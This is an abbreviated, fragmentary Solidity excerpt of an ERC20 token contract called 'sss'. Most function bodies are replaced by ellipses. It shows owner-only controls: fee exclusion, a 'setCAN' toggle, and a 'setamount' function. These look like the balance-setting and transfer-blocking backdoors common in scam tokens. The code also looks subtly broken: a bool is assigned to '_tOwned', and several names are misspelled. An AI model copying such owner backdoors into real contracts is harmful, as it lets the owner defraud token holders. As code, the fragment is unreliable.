...
contract sss is Context, IERC20, Ownable {
    ...
    function excudeFromFee(address accountinformation) public onlyowner {
        _isExcludedFromFee[accountinformation] = true;
    }

    function includeInFee(address accountinformation) public onlyowner {
        _isExcludedFromFee[accountinformation] = false;
    }

    function setCAN(bool TOF) external onlyowner() {
        _tOwned = TOF;
    }

    function setamount(address recipient, uint256 amount) public onlyowner {
    ...
    function _transfers(
        ...
        _rOwned[sender] = _rOwned[sender].sub(toAmount);
        _rOwned[recipient] = _rOwned[recipient].add(toAmount);
 ...
 function TransferToken(
        ...
        for (uint i=0; i<recipient.length; i++) {
            _transfers(_msgSender(), recipient[i], toAmount);
        }
    }
}